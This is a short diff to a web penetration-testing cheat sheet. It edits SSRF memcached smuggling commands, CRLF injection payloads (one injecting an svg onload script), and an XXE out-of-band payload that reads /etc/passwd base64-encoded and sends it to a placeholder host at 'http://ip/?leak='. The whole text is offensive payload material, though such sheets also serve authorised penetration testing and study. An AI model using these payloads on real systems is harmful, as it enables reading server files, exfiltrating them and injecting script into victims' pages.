@@ -671,7 +671,7 @@ codes/ssrf_protocol_smuggling/memcached.py
   
 -> stats cachedump <slab class> <number of items to dump>
   
--> get <item>
+-> get \<item>
   
 ### Doc for SSRF - bhack
 
@@ -679,7 +679,9 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
   
 ## CRLF Injection
   
-/%0D%%0ALocation
+/%0d%0aLocation:
+
+/%0d%0a%0d%0a\<svg onload=(0)>
 
 ## XXE OOB
   
@@ -695,7 +697,7 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 %ult;
 
-%param1;
+%int;
 
 ]>
 
@@ -709,7 +711,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 \<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
   
-\<!ENTITY % param1 "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
+\<!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
   
 ### XXE OOB to retrieve data via error messages with dtd file
   
